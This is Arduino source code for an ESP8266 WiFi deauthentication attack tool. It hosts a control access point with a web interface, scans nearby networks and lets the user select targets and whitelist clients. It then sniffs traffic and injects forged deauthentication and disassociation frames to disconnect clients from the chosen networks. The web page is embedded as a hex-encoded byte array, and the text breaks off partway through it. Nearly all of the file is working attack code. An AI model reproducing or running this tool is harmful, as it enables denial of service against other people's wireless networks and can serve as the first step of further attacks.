#include <Arduino.h>

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>

#define maxAPScanResults 80
#define maxWhite 80
#define maxPackets 80

extern "C" {
#include "user_interface.h"
}

ESP8266WebServer server(80);

void startWifi(){
  WiFi.mode(WIFI_STA);
  WiFi.softAP("uchiha","deauther",1,true);
}

/*********************** AP *****************************/
int apsRes=0;

typedef struct{
  int channel;
  int rssi;
  String names;
  int encryption;
  bool hidden;
  String mac;
  bool selected;
}Ap;
Ap aps[maxAPScanResults];
int selAPch[maxAPScanResults];
String selAPmac[maxAPScanResults];


String getAPScan(){
  String json="{\"aps\":[";
  for(int i=0;i<apsRes;i++){

      if(i!=0){
        json+=",";
      }
      json+="{\"i\":"+(String)i;
      json+=",\"c\":"+(String)aps[i].channel;
      json+=",\"h\":"+(String)aps[i].hidden;
      json+=",\"m\":\""+aps[i].mac;
      json+="\",\"ss\":\""+aps[i].names;
      json+="\",\"r\":"+(String)aps[i].rssi;
      json+=",\"e\":"+(String)aps[i].encryption;
      json+=",\"se\":"+(String)aps[i].selected;
      json+="}";
  }
  json+="]}";

  //Serial.println(json);
  return json;
}

void apscan(){
  for(int i=0;i<maxAPScanResults;i++){
    aps[i].hidden = aps[i].selected = false;
    aps[i].channel = aps[i].rssi = aps[i].encryption = 0;
    aps[i].names = aps[i].mac = "";
  }
  WiFi.scanDelete();
  apsRes = WiFi.scanNetworks(false, true);
  if(apsRes>maxAPScanResults)
    apsRes=maxAPScanResults;
  for(int i=0;i<apsRes;i++){
      
      aps[i].channel = WiFi.channel(i);
      aps[i].rssi = WiFi.RSSI(i);
      aps[i].encryption = WiFi.encryptionType(i);
      aps[i].hidden = WiFi.isHidden(i);
      aps[i].names = WiFi.SSID(i);
      aps[i].mac = WiFi.BSSIDstr(i);
  }
  server.send(200,"text/json",getAPScan());
}

int selAPind=0;
void apsel(){
  if(server.hasArg("num")){
    int i=server.arg("num").toInt();
    if(!aps[i].selected)
      aps[i].selected=true;
    else
      aps[i].selected=false;
    for(i=0,selAPind=0;i<apsRes;i++){
      if(aps[i].selected){
        selAPch[selAPind]=aps[i].channel;
        selAPmac[selAPind]=aps[i].mac;
        selAPind++;
      }
    }
    //Serial.printf("Selected APs : %d\n",selAPind);
  }
  server.send(200,"text/json",getAPScan());
}


/*********************** CLIENT WHITELIST*****************************/
int wcmacno=0;
String wcmac[maxWhite];
void adw(){
  if(server.hasArg("mac")){
    if(wcmacno>maxWhite){
      server.send(200,"text/html","2");
    }else{
      for(int i=0;i<wcmacno;i++){
        if(wcmac[i]==server.arg("mac")){
          server.send(200,"text/html","1");
          return;
        }
      }
      wcmac[wcmacno++]=server.arg("mac");
      server.send(200,"text/html","0");
    }
  }
}

String getWC(){
  String json="{\"wcmac\":[";
  for(int i=0;i<wcmacno;i++){

      if(i!=0){
        json+=",";
      }
      json+="\""+wcmac[i]+"\"";
  }
  json+="]}";

  //Serial.println(json);
  return json;
}

void dlw(){
  if(server.hasArg("num")){
    int no=server.arg("num").toInt();
    if(no!=wcmacno-1)
      for(int i=no;i<wcmacno-1;i++)
        wcmac[i]=wcmac[i+1];
    wcmac[wcmacno-1]="";
    wcmacno--;
  }
  server.send(200,"text/json",getWC());
}

void wcli(){
  server.send(200,"text/json",getWC());
}

/************************ SNIFF & ATTACK***************************/
bool sniffing=false;
int curAPind=0;
int curAPch;

void sniff(){
  server.send(200,"text/html","0");
  curAPch=selAPch[curAPind];

//Serial.print("setting ch to ");
//Serial.printf("%d\n",curAPch);

  wifi_promiscuous_enable(0);
  WiFi.disconnect();
  sniffing=true;
  wifi_set_opmode(STATION_MODE);
  wifi_set_channel(curAPch);
  wifi_promiscuous_enable(1);
}

String mac2str(byte ar[]){
  String s;
  for(byte i=0;i<6;i++){
    char buf[3];
    sprintf(buf,"%02X",ar[i]);
    s+=buf;
    if(i<5)
      s+=':';
  }
  return s;
}

uint8_t packet[maxPackets][2][26];
int packetind=0;


bool isPresent(uint8_t *buf,int ind){
    if(buf[16+0]==packet[ind][0][10+0]&&buf[22+0]==packet[ind][0][4+0] && buf[16+1]==packet[ind][0][10+1]&&buf[22+1]==packet[ind][0][4+1] && buf[16+2]==packet[ind][0][10+2]&&buf[22+2]==packet[ind][0][4+2] && buf[16+3]==packet[ind][0][10+3]&&buf[22+3]==packet[ind][0][4+3] && buf[16+4]==packet[ind][0][10+4]&&buf[22+4]==packet[ind][0][4+4] && buf[16+5]==packet[ind][0][10+5]&&buf[22+5]==packet[ind][0][4+5])
      return true;
  return false;
}

int cappkts=0;
void sniffer(uint8_t *buf, uint16_t len) {
  
  if(len>27){
    String from=mac2str(buf+16);
    String to=mac2str(buf+22);
    bool wcprsnt=false;
    for(int i=0;i<wcmacno;i++){
      if(strcmp(wcmac[i].c_str(),to.c_str())==0){
        //Serial.println("whitelited client mac : "+to);
        wcprsnt=true;break;
      }
    }
    
    
    if(!wcprsnt){
      for(int i=0;i<selAPind;i++){
        if(strcmp(from.c_str(),selAPmac[i].c_str())==0){
          bool add=true;
          for(int i=0;i<packetind;i++){
            if(isPresent(buf,i)){//check packet present or not
              add=false;
            }
          }
          if(add){
          for(int i=0;i<2;i++){
            if(i==0)
              packet[packetind][i][0]=0xc0;//deauthentication //2nd byte of frame control
            else
              packet[packetind][i][0]=0xa0;//disaccosiation //2nd byte of frame control
            packet[packetind][i][1]=0;//1st byte of frame control
            packet[packetind][i][2]=0;//2nd byte of duration
            packet[packetind][i][3]=0;//1st byte of duration
            for(int j=0;j<6;j++)
              packet[packetind][i][4+j]=buf[22+j];//client
            for(int j=0;j<6;j++)
              packet[packetind][i][10+j]=packet[packetind][i][16+j]=buf[16+j];//ap
             packet[packetind][i][22]=0;
             packet[packetind][i][23]=0;
             packet[packetind][i][24]=1;//reason
             packet[packetind][i][25]=0;
           }
           packetind++;
          }
          for(int i=0;i<packetind;i++)
            for(int j=0;j<2;j++)
              wifi_send_pkt_freedom(&packet[i][j][0], 26, true);//to perform packet injection
        }
      }
    }
    
  }


  if(selAPind>1){
    cappkts++;
    if(cappkts>=200){
      cappkts=0;
      curAPind++;
      if(curAPind>=selAPind)
        curAPind=0;
      curAPch=selAPch[curAPind];
      wifi_set_channel(curAPch);
      //Serial.print("changed ch to ");
      //Serial.printf("%d\n",curAPch);
    }
  }
}

/******************************* HTML **********************************/
char htmlbuf[7000];
const static uint8_t indexhtml[] PROGMEM = {0x3c,0x68,0x74,0x6d,0x6c,0x3e,0x20,0x3c,0x68,0x65,0x61,0x64,0x3e,0x20,0x3c,0x74,0x69,0x74,0x6c,0x65,0x3e,0x57,0x69,0x46,0x69,0x20,0x44,0x65,0x61,0x75,0x74,0x68,0x3c,0x2f,0x74,0x69,0x74,0x6c,0x65,0x3e,0x20,0x3c,0x73,0x74,0x79,0x6c,0x65,0x3e,0x20,0x62,0x6f,0x64,0x79,0x7b,0x20,0x6d,0x61,0x72,0x67,0x69,0x6e,0x3a,0x35,0x70,0x78,0x3b,0x20,0x63,0x6f,0x6c,0x6f,0x72,0x3a,0x23,0x30,0x30,0x46,0x46,0x30,0x30,0x3b,0x20,0x7d,0x20,0x74,0x61,0x62,0x6c,0x65,0x2c,0x74,0x64,0x20,0x7b,0x20,0x62,0x6f,0x72,0x64,0x65,0x72,0x3a,0x20,0x31,0x70,0x78,0x20,0x73,0x6f,0x6c,0x69,0x64,0x20,0x23,0x30,0x30,0x46,0x46,0x30,0x30,0x3b,0x20,0x62,0x6f,0x72,0x64,0x65,0x72,0x2d,0x63,0x6f,0x6c,0x6c,0x61,0x70,0x73,0x65,0x3a,0x20,0x63,0x6f,0x6c,0x6c,0x61,0x70,0x73,0x65,0x3b,0x20,0x7d,0x20,0x74,0x64,0x7b,0x20,0x70,0x61,0x64,0x64,0x69,0x6e,0x67,0x3a,0x20,0x37,0x70,0x78,0x3b,0x20,0x7d,0x20,0x61,0x7b,0x20,0x74,0x65,0x78,0x74,0x2d,0x64,0x65,0x63,0x6f,0x72,0x61,0x74,0x69,0x6f,0x6e,0x3a,0x20,0x6e,0x6f,0x6e,0x65,0x3b,0x20,0x63,0x6f,0x6c,0x6f,0x72,0x3a,0x20,0x23,0x66,0x66,0x30,0x30,0x30,0x30,0x3b,0x20,0x63,0x75,0x72,0x73,0x6f,0x72,0x3a,0x20,0x70,0x6f,0x69,0x6e,0x74,0x65,0x72,0x3b,0x20,0x7d,0x20,0x62,0x75,0x74,0x74,0x6f,0x6e,0x7b,0x20,0x62,0x61,0x63,0x6b,0x67,0x72,0x6f,0x75,0x6e,0x64,0x2d,0x63,0x6f,0x6c,0x6f,0x72,0x3a,0x20,0x23,0x30,0x30,0x30,0x30,0x30,0x30,0x3b,0x20,0x62,0x6f,0x72,0x64,0x65,0x72,0x3a,0x20,0x31,0x70,0x78,0x20,0x73,0x6f,0x6c,0x69,0x64,0x20,0x23,0x30,0x30,0x46,0x46,0x30,0x30,0x3b,0x20,0x63,0x6f,0x6c,0x6f,0x72,0x3a,0x20,0x23,0x30,0x30,0x46,0x46,0x30,0x30,0x3b,0x20,0x70,0x61,0x64,0x64,0x69,0x6e,0x67,0x3a,0x20,0x37,0x70,0x78,0x20,0x31,0x34,0x70,0x78,0x3b,0x20,0x74,0x65,0x78,0x74,0x2d,0x61,0x6c,0x69,0x67,0x6e,0x3a,0x20,0x63,0x65,0x6e,0x74,0x65,0x72,0x3b,0x20,0x7d,0x20,0x23,0x64,0x69,0x76,0x31,0x2c,0x23,0x64,0x69,0x76,0x32,0x7b,0x20,0x70,0x61,0x64,0x64,0x69,0x6e,0x67,0x3a,0x31,0x30,0x70,0x78,0x3b,0x20,0x62,0x6f,0x72,0x64,0x65,0x72,0x3a,0x31,0x70,0x78,0x20,0x73,0x6f,0x6c,0x69,0x64,0x20,0x23,0x30,0x30,0x46,0x46,0x30,0x30,0x3b,0x20,0x7d,0x20,0x23,0x64,0x69,0x76,0x33,0x7b,0x20,0x64,0x69,0x73,0x70,0x6c,0x61,0x79,0x3a,0x6e,0x6f,0x6e,0x65,0x3b,0x20,0x7d,0x20,0x23,0x74,0x62,0x32,0x2c,0x23,0x74,0x62,0x32,0x20,0x74,0x64,0x7b,0x20,0x62,0x6f,0x72,0x64,0x65,0x72,0x3a,0x20,0x30,0x70,0x78,0x20,0x73,0x6f,0x6c,0x69,0x64,0x20,0x23,0x30,0x30,0x30,0x30,0x30,0x30,0x3b,0x20,0x7d,0x20,0x69,0x6e,0x70,0x75,0x74,0x7b,0x20,0x62,0x61,0x63,0x6b,0x67,0x72,0x6f,0x75,0x6e,0x64,0x2d,0x63,0x6f,0x6c,0x6f,0x72,0x3a,0x20,0x23,0x30,0x30,0x30,0x30,0x30,0x30,0x3b,0x20,0x63,0x6f,0x6c,0x6f,0x72,0x3a,0x23,0x30,0x30,0x46,0x46,0x30,0x30,0x3b,0x20,0x6d,0x61,0x72,0x67,0x69,0x6e,0x3a,0x35,0x70,0x78,0x3b,0x20,0x62,0x6f,0x72,0x64,0x65,0x72,0x3a,0x20,0x31,0x70,0x78,0x20,0x73,0x6f,0x6c,0x69,0x64,0x20,0x23,0x30,0x30,0x46,0x46,0x30,0x30,0x3b,0x20,0x7d,0x20,0x3c,0x2f,0x73,0x74,0x79,0x6c,0x65,0x3e,0x20,0x3c,0x73,0x63,0x72,0x69,0x70,0x74,0x3e,0x20,0x66,0x75,0x6e,0x63,0x74,0x69,0x6f,0x6e,0x20,0x67,0x65,0x74,0x45,0x6e,0x63,0x72,0x79,0x70,0x74,0x69,0x6f,0x6e,0x28,0x6e,0x75,0x6d,0x29,0x20,0x7b,0x20,0x69,0x66,0x20,0x28,0x6e,0x75,0x6d,0x20,0x3d,0x3d,0x20,0x38,0x29,0x20,0x72,0x65,0x74,0x75,0x72,0x6e,0x20,0x22,0x57,0x50,0x41,0x2a,0x22,0x3b,0x20,0x65,0x6c,0x73,0x65,0x20,0x69,0x66,0x20,0x28,0x6e,0x75,0x6d,0x20,0x3d,0x3d,0x20,0x34,0x29,0x20,0x72,0x65,0x74,0x75,0x72,0x6e,0x20,0x22,0x57,0x50,0x41,0x32,0x22,0x3b,0x20,0x65,0x6c,0x73,0x65,0x20,0x69,0x66,0x20,0x28,0x6e,0x75,0x6d,0x20,0x3d,0x3d,0x20,0x32,0x29,0x20,0x72,0x65,0x74,0x75,0x72,0x6e,0x20,0x22,0x57,0x50,0x41,0x22,0x3b,0x20,0x65,0x6c,0x73,0x65,0x20,0x69,0x66,0x20,0x28,0x6e,0x75,0x6d,0x20,0x3d,0x3d,0x20,0x37,0x29,0x20,0x72,0x65,0x74,0x75,0x72,0x6e,0x20,0x22,0x6e,0x6f,0x6e,0x65,0x22,0x3b,0x20,0x65,0x6c,0x73,0x65,0x20,0x69,0x66,0x20,0x28,0x6e,0x75,0x6d,0x20,0x3d,0x3d,0x20,0x35,0x29,0x20,0x72,0x65,0x74,0x75,0x72,0x6e,0x20,0x22,0x57,0x45,0x50,0x22,0x3b,0x20,0x7d,0x20,0x66,0x75,0x6e,0x63,0x74,0x69,0x6f,0x6e,0x20,0x69,0x6e,0x74,0x54,0x6f,0x42,0x6f,0x6f,0x6c,0x28,0x6e,0x75,0x6d,0x29,0x7b,0x20,0x69,0x66,0x20,0x28,0x6e,0x75,0x6d,0x20,0x3d,0x3d,0x20,0x30,0x29,0x20,0x72,0x65,0x74,0x75,0x72,0x6e,0x20,0x22,0x46,0x61,0x6c,0x73,0x65,0x22,0x3b,0x20,0x65,0x6c,0x73,0x65,0x20,0x69,0x66,0x20,0x28,0x6e,0x75,0x6d,0x20,0x3d,0x3d,0x20,0x31,0x29,0x20,0x72,0x65,0x74,0x75,0x72,0x6e,0x20,0x22,0x54,0x72,0x75,0x65,0x22,0x3b,0x20,0x7d,0x20,0x76,0x61,0x72,0x20,0x63,0x73,0x74,0x72,0x74,0x3d,0x66,0x61,0x6c,0x73,0x65,0x3b,0x20,0x66,0x75,0x6e,0x63,0x74,0x69,0x6f,0x6e,0x20,0x78,0x68,0x72,0x28,0x75,0x72,0x6c,0x2c,0x69,0x64,0x2c,0x62,0x29,0x7b,0x20,0x69,0x66,0x28,0x77,0x69,0x6e,0x64,0x6f,0x77,0x2e,0x58,0x4d,0x4c,0x48,0x74,0x74,0x70,0x52,0x65,0x71,0x75,0x65,0x73,0x74,0x29,0x20,0x78,0x68,0x74,0x74,0x70,0x3d,0x6e,0x65,0x77,0x20,0x58,0x4d,0x4c,0x48,0x74,0x74,0x70,0x52,0x65,0x71,0x75,0x65,0x73,0x74,0x28,0x29,0x3b,0x20,0x65,0x6c,0x73,0x65,0x20,0x78,0x68,0x74,0x74,0x70,0x3d,0x6e,0x65,0x77,0x20,0x41,0x63,0x74,0x69,0x76,0x65,0x58,0x4f,0x62,0x6a,0x65,0x63,0x74,0x28,0x22,0x4d,0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x2e,0x58,0x4d,0x4c,0x48,0x54,0x54,0x50,0x22,0x29,0x3b,0x20,0x78,0x68,0x74,0x74,0x70,0x2e,0x6f,0x6e,0x72,0x65,0x61,0x64,0x79,0x73,0x74,0x61,0x74,0x65,0x63,0x68,0x61,0x6e,0x67,0x65,0x20,0x3d,0x20,0x66,0x75,0x6e,0x63,0x74,0x69,0x6f,0x6e,0x28,0x29,0x20,0x7b,0x20,0x69,0x66,0x28,0x74,0x68,0x69,0x73,0x2e,0x72,0x65,0x61,0x64,0x79,0x53,0x74,0x61,0x74,0x65,0x20,0x3d,0x3d,0x20,0x34,0x20,0x26,0x26,0x20,0x74,0x68,0x69,0x73,0x2e,0x73,0x74,0x61,0x74,0x75,0x73,0x20,0x3d,0x3d,0x20,0x32,0x30,0x30,0x29,0x20,0x7b,0x20,0x69,0x66,0x28,0x62,0x3d,0x3d,0x30,0x29,0x7b,0x20,0x76,0x61,0x72,0x20,0x72,0x65,0x63,0x76,0x3d,0x4a,0x53,0x4f,0x4e,0x2e,0x70,0x61,0x72,0x73,0x65,0x28,0x74,0x68,0x69,0x73,0x2e,0x72,0x65,0x73,0x70,0x6f,0x6e,0x73,0x65,0x54,0x65,0x78,0x74,0x29,0x3b,0x20,0x69,0x66,0x28,0x69,0x64,0x3d,0x3d,0x22,0x62,0x74,0x6e,0x31,0x22,0x29,0x7b,0x20,0x69,0x66,0x28,0x21,0x63,0x73,0x74,0x72,0x74,0x29,0x7b,0x20,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x67,0x65,0x74,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x42,0x79,0x49,0x64,0x28,0x69,0x64,0x29,0x2e,0x69,0x6e,0x6e,0x65,0x72,0x48,0x54,0x4d,0x4c,0x20,0x3d,0x20,0x22,0x53,0x43,0x41,0x4e,0x22,0x3b,0x20,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x67,0x65,0x74,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x42,0x79,0x49,0x64,0x28,0x69,0x64,0x29,0x2e,0x73,0x74,0x79,0x6c,0x65,0x2e,0x62,0x6f,0x72,0x64,0x65,0x72,0x3d,0x22,0x31,0x70,0x78,0x20,0x73,0x6f,0x6c,0x69,0x64,0x20,0x23,0x30,0x30,0x46,0x46,0x30,0x30,0x22,0x3b,0x20,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x67,0x65,0x74,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x42,0x79,0x49,0x64,0x28,0x69,0x64,0x29,0x2e,0x73,0x74,0x79,0x6c,0x65,0x2e,0x63,0x6f,0x6c,0x6f,0x72,0x3d,0x22,0x23,0x30,0x30,0x46,0x46,0x30,0x30,0x22,0x3b,0x20,0x7d,0x20,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x67,0x65,0x74,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x42,0x79,0x49,0x64,0x28,0x69,0x64,0x29,0x2e,0x6e,0x61,0x6d,0x65,0x3d,0x22,0x62,0x74,0x6e,0x31,0x6e,0x22,0x3b,0x20,0x7d,0x20,0x69,0x66,0x28,0x4f,0x62,0x6a,0x65,0x63,0x74,0x2e,0x6b,0x65,0x79,0x73,0x28,0x72,0x65,0x63,0x76,0x2e,0x61,0x70,0x73,0x29,0x2e,0x6c,0x65,0x6e,0x67,0x74,0x68,0x3e,0x30,0x29,0x7b,0x20,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x67,0x65,0x74,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x42,0x79,0x49,0x64,0x28,0x22,0x74,0x62,0x31,0x22,0x29,0x2e,0x69,0x6e,0x6e,0x65,0x72,0x48,0x54,0x4d,0x4c,0x3d,0x22,0x3c,0x74,0x72,0x3e,0x3c,0x74,0x64,0x3e,0x53,0x65,0x6c,0x65,0x63,0x74,0x3c,0x2f,0x74,0x64,0x3e,0x3c,0x74,0x64,0x3e,0x53,0x53,0x49,0x44,0x3c,0x2f,0x74,0x64,0x3e,0x3c,0x74,0x64,0x3e,0x43,0x68,0x61,0x6e,0x6e,0x65,0x6c,0x3c,0x2f,0x74,0x64,0x3e,0x3c,0x74,0x64,0x3e,0x52,0x53,0x53,0x49,0x3c,0x2f,0x74,0x64,0x3e,0x3c,0x74,0x64,0x3e,0x48,0x69,0x64,0x64,0x65,0x6e,0x3c,0x2f,0x74,0x64,0x3e,0x3c,0x74,0x64,0x3e,0x4d,0x41,0x43,0x3c,0x2f,0x74,0x64,0x3e,0x3c,0x74,0x64,0x3e,0x45,0x6e,0x63,0x72,0x79,0x70,0x74,0x2e,0x3c,0x2f,0x74,0x64,0x3e,0x3c,0x2f,0x74,0x72,0x3e,0x22,0x3b,0x20,0x66,0x6f,0x72,0x28,0x76,0x61,0x72,0x20,0x69,0x3d,0x30,0x3b,0x69,0x3c,0x4f,0x62,0x6a,0x65,0x63,0x74,0x2e,0x6b,0x65,0x79,0x73,0x28,0x72,0x65,0x63,0x76,0x2e,0x61,0x70,0x73,0x29,0x2e,0x6c,0x65,0x6e,0x67,0x74,0x68,0x3b,0x69,0x2b,0x2b,0x29,0x7b,0x20,0x69,0x66,0x28,0x72,0x65,0x63,0x76,0x2e,0x61,0x70,0x73,0x5b,0x69,0x5d,0x2e,0x73,0x65,0x3d,0x3d,0x22,0x31,0x22,0x29,0x7b,0x20,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x67,0x65,0x74,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x42,0x79,0x49,0x64,0x28,0x22,0x74,0x62,0x31,0x22,0x29,0x2e,0x69,0x6e,0x6e,0x65,0x72,0x48,0x54,0x4d,0x4c,0x2b,0x3d,0x22,0x3c,0x74,0x72,0x20,0x73,0x74,0x79,0x6c,0x65,0x3d,0x5c,0x22,0x63,0x6f,0x6c,0x6f,0x72,0x3a,0x23,0x66,0x66,0x30,0x30,0x30,0x30,0x5c,0x22,0x3e,0x3c,0x74,0x64,0x3e,0x3c,0x69,0x6e,0x70,0x75,0x74,0x20,0x74,0x79,0x70,0x65,0x3d,0x63,0x68,0x65,0x63,0x6b,0x62,0x6f,0x78,0x20,0x6f,0x6e,0x63,0x6c,0x69,0x63,0x6b,0x3d,0x78,0x68,0x72,0x28,0x5c,0x22,0x61,0x70,0x73,0x65,0x6c,0x3f,0x6e,0x75,0x6d,0x3d,0x22,0x2b,0x72,0x65,0x63,0x76,0x2e,0x61,0x70,0x73,0x5b,0x69,0x5d,0x2e,0x69,0x2b,0x22,0x5c,0x22,0x2c,0x5c,0x22,0x5c,0x22,0x2c,0x30,0x29,0x20,0x63,0x68,0x65,0x63,0x6b,0x65,0x64,0x3e,0x3c,0x2f,0x74,0x64,0x3e,0x3c,0x74,0x64,0x3e,0x22,0x2b,0x72,0x65,0x63,0x76,0x2e,0x61,0x70,0x73,0x5b,0x69,0x5d,0x2e,0x73,0x73,0x2b,0x22,0x3c,0x2f,0x74,0x64,0x3e,0x3c,0x74,0x64,0x3e,0x22,0x2b,0x72,0x65,0x63,0x76,0x2e,0x61,0x70,0x73,0x5b,0x69,0x5d,0x2e,0x63,0x2b,0x22,0x3c,0x2f,0x74,0x64,0x3e,0x3c,0x74,0x64,0x3e,0x22,0x2b,0x72,0x65,0x63,0x76,0x2e,0x61,0x70,0x73,0x5b,0x69,0x5d,0x2e,0x72,0x2b,0x22,0x3c,0x2f,0x74,0x64,0x3e,0x3c,0x74,0x64,0x3e,0x22,0x2b,0x69,0x6e,0x74,0x54,0x6f,0x42,0x6f,0x6f,0x6c,0x28,0x72,0x65,0x63,0x76,0x2e,0x61,0x70,0x73,0x5b,0x69,0x5d,0x2e,0x68,0x29,0x2b,0x22,0x3c,0x2f,0x74,0x64,0x3e,0x3c,0x74,0x64,0x3e,0x22,0x2b,0x72,0x65,0x63,0x76,0x2e,0x61,0x70,0x73,0x5b,0x69,0x5d,0x2e,0x6d,0x2b,0x22,0x3c,0x2f,0x74,0x64,0x3e,0x3c,0x74,0x64,0x3e,0x22,0x2b,0x67,0x65,0x74,0x45,0x6e,0x63,0x72,0x79,0x70,0x74,0x69,0x6f,0x6e,0x28,0x72,0x65,0x63,0x76,0x2e,0x61,0x70,0x73,0x5b,0x69,0x5d,0x2e,0x65,0x29,0x2b,0x22,0x3c,0x2f,0x74,0x64,0x3e,0x3c,0x2f,0x74,0x72,0x3e,0x22,0x3b,0x20,0x7d,0x65,0x6c,0x73,0x65,0x7b,0x20,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x67,0x65,0x74,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x42,0x79,0x49,0x64,0x28,0x22,0x74,0x62,0x31,0x22,0x29,0x2e,0x69,0x6e,0x6e,0x65,0x72,0x48,0x54,0x4d,0x4c,0x2b,0x3d,0x22,0x3c,0x74,0x72,0x3e,0x3c,0x74,0x64,0x3e,0x3c,0x69,0x6e,0x70,0x75,0x74,0x20,0x74,0x79,0x70,0x65,0x3d,0x72,0x61,0x64,0x69,0x6f,0x20,0x6f,0x6e,0x63,0x6c,0x69,0x63,0x6b,0x3d,0x78,0x68,0x72,0x28,0x5c,0x22,0x61,0x70,0x73,0x65,0x6c,0x3f,0x6e,0x75,0x6d,0x3d,0x22,0x2b,0x72,0x65,0x63,0x76,0x2e,0x61,0x70,0x73,0x5b,0x69,0x5d,0x2e,0x69,0x2b,0x22,0x5c,0x22,0x2c,0x5c,0x22,0x5c,0x22,0x2c,0x30,0x29,0x3e,0x3c,0x2f,0x74,0x64,0x3e,0x3c,0x74,0x64,0x3e,0x22,0x2b,0x72,0x65,0x63,0x76,0x2e,0x61,0x70,0x73,0x5b,0x69,0x5d,0x2e,0x73,0x73,0x2b,0x22,0x3c,0x2f,0x74,0x64,0x3e,0x3c,0x74,0x64,0x3e,0x22,0x2b,0x72,0x65,0x63,0x76,0x2e,0x61,0x70,0x73,0x5b,0x69,0x5d,0x2e,0x63,0x2b,0x22,0x3c,0x2f,0x74,0x64,0x3e,0x3c,0x74,0x64,0x3e,0x22,0x2b,0x72,0x65,0x63,0x76,0x2e,0x61,0x70,0x73,0x5b,0x69,0x5d,0x2e,0x72,0x2b,0x22,0x3c,0x2f,0x74,0x64,0x3e,0x3c,0x74,0x64,0x3e,0x22,0x2b,0x69,0x6e,0x74,0x54,0x6f,0x42,0x6f,0x6f,0x6c,0x28,0x72,0x65,0x63,0x76,0x2e,0x61,0x70,0x73,0x5b,0x69,0x5d,0x2e,0x68,0x29,0x2b,0x22,0x3c,0x2f,0x74,0x64,0x3e,0x3c,0x74,0x64,0x3e,0x22,0x2b,0x72,0x65,0x63,0x76,0x2e,0x61,0x70,0x73,0x5b,0x69,0x5d,0x2e,0x6d,0x2b,0x22,0x3c,0x2f,0x74,0x64,0x3e,0x3c,0x74,0x64,0x3e,0x22,0x2b,0x67,0x65,0x74,0x45,0x6e,0x63,0x72,0x79,0x70,0x74,0x69,0x6f,0x6e,0x28,0x72,0x65,0x63,0x76,0x2e,0x61,0x70,0x73,0x5b,0x69,0x5d,0x2e,0x65,0x29,0x2b,0x22,0x3c,0x2f,0x74,0x64,0x3e,0x3c,0x2f,0x74,0x72,0x3e,0x22,0x3b,0x20,0x7d,0x20,0x7d,0x20,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x67,0x65,0x74,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x42,0x79,0x49,0x64,0x28,0x22,0x64,0x69,0x76,0x33,0x22,0x29,0x2e,0x73,0x74,0x79,0x6c,0x65,0x2e,0x64,0x69,0x73,0x70,0x6c,0x61,0x79,0x3d,0x22,0x6e,0x6f,0x6e,0x65,0x22,0x3b,0x20,0x66,0x6f,0x72,0x28,0x76,0x61,0x72,0x20,0x69,0x3d,0x30,0x3b,0x69,0x3c,0x4f,0x62,0x6a,0x65,0x63,0x74,0x2e,0x6b,0x65,0x79,0x73,0x28,0x72,0x65,0x63,0x76,0x2e,0x61,0x70,0x73,0x29,0x2e,0x6c,0x65,0x6e,0x67,0x74,0x68,0x3b,0x69,0x2b,0x2b,0x29,0x7b,0x20,0x69,0x66,0x28,0x72,0x65,0x63,0x76,0x2e,0x61,0x70,0x73,0x5b,0x69,0x5d,0x2e,0x73,0x65,0x3d,0x3d,0x22,0x31,0x22,0x29,0x7b,0x20,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x67,0x65,0x74,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x42,0x79,0x49,0x64,0x28,0x22,0x64,0x69,0x76,0x33,0x22,0x29,0x2e,0x73,0x74,0x79,0x6c,0x65,0x2e,0x64,0x69,0x73,0x70,0x6c,0x61,0x79,0x3d,0x22,0x62,0x6c,0x6f,0x63,0x6b,0x22,0x3b,0x20,0x62,0x72,0x65,0x61,0x6b,0x3b,0x20,0x7d,0x20,0x7d,0x20,0x7d,0x20,0x7d,0x65,0x6c,0x73,0x65,0x20,0x69,0x66,0x28,0x62,0x3d,0x3d,0x31,0x29,0x7b,0x20,0x69,0x66,0x28,0x74,0x68,0x69,0x73,0x2e,0x72,0x65,0x73,0x70,0x6f,0x6e,0x73,0x65,0x54,0x65,0x78,0x74,0x3d,0x3d,0x22,0x30,0x22,0x29,0x7b,0x20,0x78,0x68,0x72,0x28,0x22,0x77,0x63,0x6c,0x69,0x22,0x2c,0x22,0x22,0x2c,0x32,0x29,0x3b,0x20,0x7d,0x65,0x6c,0x73,0x65,0x20,0x69,0x66,0x28,0x74,0x68,0x69,0x73,0x2e,0x72,0x65,0x73,0x70,0x6f,0x6e,0x73,0x65,0x54,0x65,0x78,0x74,0x3d,0x3d,0x22,0x31,0x22,0x29,0x7b,0x20,0x61,0x6c,0x65,0x72,0x74,0x28,0x22,0x44,0x75,0x70,0x6c,0x69,0x63,0x61,0x74,0x65,0x20,0x4d,0x41,0x43,0x22,0x29,0x3b,0x20,0x7d,0x65,0x6c,0x73,0x65,0x20,0x69,0x66,0x28,0x74,0x68,0x69,0x73,0x2e,0x72,0x65,0x73,0x70,0x6f,0x6e,0x73,0x65,0x54,0x65,0x78,0x74,0x3d,0x3d,0x22,0x32,0x22,0x29,0x7b,0x20,0x61,0x6c,0x65,0x72,0x74,0x28,0x22,0x4c,0x69,0x6d,0x69,0x74,0x20,0x45,0x78,0x63,0x65,0x65,0x64,0x65,0x64,0x5c,0x6e,0x4f,0x6e,0x6c,0x79,0x20,0x38,0x30,0x20,0x63,0x61,0x6e,0x20,0x62,0x65,0x20,0x61,0x64,0x64,0x65,0x64,0x2e,0x22,0x29,0x3b,0x20,0x7d,0x20,0x7d,0x65,0x6c,0x73